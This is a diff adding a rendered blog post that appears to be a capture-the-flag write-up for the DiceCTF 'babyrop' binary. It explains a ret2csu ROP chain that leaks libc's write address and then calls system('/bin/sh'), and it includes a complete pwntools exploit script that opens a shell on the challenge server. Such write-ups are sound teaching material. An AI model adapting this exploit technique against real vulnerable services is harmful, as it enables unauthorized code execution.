@@ -1,0 +1,154 @@
+I"�6<h2 id="challenge-description">Challenge Description</h2>
+<p><img src="/assets/images/challdesbabyrop.png" alt="" /></p>
+
+<h3 id="solution">Solution:</h3>
+
+<ul>
+  <li>Checkout the mitigations of the binary</li>
+  <li>Try to find gadgets since this is a ROP challenge. If you dont know much about ROP checkout <a href="https://ropemporium.com/">ROPemporium</a>.</li>
+  <li>Craft the payload to get flag from server.</li>
+</ul>
+
+<h4 id="mitigations">Mitigations:</h4>
+<p><img src="/assets/images/mitigationdice.png" alt="" /></p>
+<ul>
+  <li>We can’t excecute shellcode (NX Enabled)</li>
+  <li>No Canary found - no need for brute force or leaks</li>
+  <li>PIE disabled - the address of the binary wont be randomised</li>
+</ul>
+
+<h4 id="finding-gadgets">Finding Gadgets:</h4>
+
+<p>Install ROPgadget to find all the gadgets in the binary.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ROPgadget <span class="nt">--binary</span> babyrop
+</code></pre></div></div>
+<p>My first thought was to <code class="language-plaintext highlighter-rouge">write</code> the address pointed by the got of <code class="language-plaintext highlighter-rouge">write</code>. The idea was to leak the address of write function. Since write has already been called by the program the GOT of write will be populated and the got will point to the libc address of write. The following gadgets are needed.</p>
+<pre><code class="language-asm">pop rdi
+pop rsi 
+pop rdx
+</code></pre>
+<p>I did not have the pop rdx register which makes the challenge a bit more intresting. So we need to find a way to set the value of RDX, RSI, RDI.</p>
+<pre><code class="language-asm">rsi - point to the buffer [write@got]
+rdi - file discriptor = 1
+rdx - size of the buffer = &gt;8
+</code></pre>
+
+<p>Since ropgadget did not give me the gadget I went to look for more gadgets in the <code class="language-plaintext highlighter-rouge">__libc_csu_init</code>. There I could find all the gadgets I wanted.</p>
+
+<h4 id="crafting-exploit">Crafting Exploit:</h4>
+
+<p>These are the important gadgets I want.</p>
+
+<p><img src="/assets/images/gadgetsdice.png" alt="" /></p>
+
+<h4 id="idea">Idea</h4>
+
+<p>First overflow the buffer with garbage and then make return jump to csu. Things to note.</p>
+
+<pre><code class="language-asm">0x00000000004011b0 &lt;+64&gt;:	mov    rdx,r14
+0x00000000004011b3 &lt;+67&gt;:	mov    rsi,r13
+0x00000000004011b6 &lt;+70&gt;:	mov    edi,r12d
+
+0x00000000004011ca &lt;+90&gt;:	pop    rbx
+0x00000000004011cb &lt;+91&gt;:	pop    rbp
+0x00000000004011cc &lt;+92&gt;:	pop    r12
+0x00000000004011ce &lt;+94&gt;:	pop    r13
+0x00000000004011d0 &lt;+96&gt;:	pop    r14
+0x00000000004011d2 &lt;+98&gt;:	pop    r15
+0x00000000004011d4 &lt;+100&gt;:	ret 
+</code></pre>
+
+<p>Now we can control the RDI, RSI, RDX because we can control the r14, r13, r12 registers. Intresting area was the call to <code class="language-plaintext highlighter-rouge">QWORD PTR [r15+rbx*8]</code> inbetween these gadgets. So we decided to make this <code class="language-plaintext highlighter-rouge">QWORD PTR [r15+rbx*8]</code> as the write function. In order to do this well set r15 as the address to write@got and rbx as 0.</p>
+
+<pre><code class="language-asm">0x00000000004011b9 &lt;+73&gt;:	call   QWORD PTR [r15+rbx*8]
+0x00000000004011bd &lt;+77&gt;:	add    rbx,0x1
+0x00000000004011c1 &lt;+81&gt;:	cmp    rbp,rbx
+0x00000000004011c4 &lt;+84&gt;:	jne    0x4011b0 &lt;__libc_csu_init+64&gt;
+</code></pre>
+<p>Hmmm :(. Seems like there is a compare statement that’ll make us jump back to the csu+64 (which is somewhere in the middle of csu). Now lets make rbp as 1 so we dont take the jump.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">buf</span> <span class="o">=</span> <span class="s">b"a"</span><span class="o">*</span><span class="mi">72</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000004011ca</span><span class="p">)</span> <span class="c1">#rbx rbp r12 r13 r14 r15
+</span><span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'write'</span><span class="p">])</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'write'</span><span class="p">])</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000004011b0</span><span class="p">)</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">7</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'main'</span><span class="p">])</span>
+</code></pre></div></div>
+
+<p>Exploit for leaking libc write address looks something like this. :) Now lets just recv the leak and see what libc they are using. To find out their libc go to <a href="https://libc.blukat.me/">libc.blukat.me</a></p>
+
+<p><img src="/assets/images/blukatdice.png" alt="" /></p>
+
+<p>Now its basic math, since all the address in the libc will be at the same offset from one another. Once you get the leak just find address of /bin/sh and system then just call system with /bin/sh as argument. Pretty intresting challenge and fun to solve :).</p>
+
+<p>Anyway here is the exploit script for this challenge.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1"># Set up pwntools for the correct architecture
+</span><span class="n">context</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s">'i386'</span><span class="p">)</span>
+<span class="n">exe</span> <span class="o">=</span> <span class="s">'./babyrop'</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./babyrop"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+
+<span class="c1"># ./exploit.py GDB
+</span><span class="n">gdbscript</span> <span class="o">=</span> <span class="s">'''
+continue
+'''</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
+
+<span class="c1">#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"dicec.tf"</span><span class="p">,</span> <span class="mi">31924</span><span class="p">)</span>
+
+<span class="c1"># shellcode = asm(shellcraft.sh())
+</span>
+<span class="s">'''
+0x00000000004011d3 : pop rdi ; ret
+
+write syscall 
+rdi = 1
+rsi = pointer to puffer (pointer to write function)
+rdx = size
+'''</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">": "</span><span class="p">)</span>
+
+<span class="n">buf</span> <span class="o">=</span> <span class="s">b"a"</span><span class="o">*</span><span class="mi">72</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000004011ca</span><span class="p">)</span> <span class="c1">#rbx rbp r12 r13 r14 r15
+</span><span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'write'</span><span class="p">])</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'write'</span><span class="p">])</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000004011b0</span><span class="p">)</span> 
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">7</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'main'</span><span class="p">])</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+
+<span class="c1"># log.info("write leak: {}".format((hex(u64(p.recv(8))))))
+</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))),</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Write leak: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">)))</span>
+
+<span class="n">sys</span> <span class="o">=</span> <span class="n">leak</span><span class="o">-</span><span class="mh">0xbbdc0</span>
+
+<span class="n">binsh</span> <span class="o">=</span> <span class="n">leak</span><span class="o">+</span><span class="mh">0xa63da</span>
+
+<span class="n">buf</span> <span class="o">=</span> <span class="s">b"a"</span><span class="o">*</span><span class="mi">72</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40116b</span><span class="p">)</span> <span class="c1">#ret
+</span><span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000004011d3</span><span class="p">)</span> <span class="c1">#pop rdi 
+</span><span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">sys</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+
+</code></pre></div></div>
+:ET
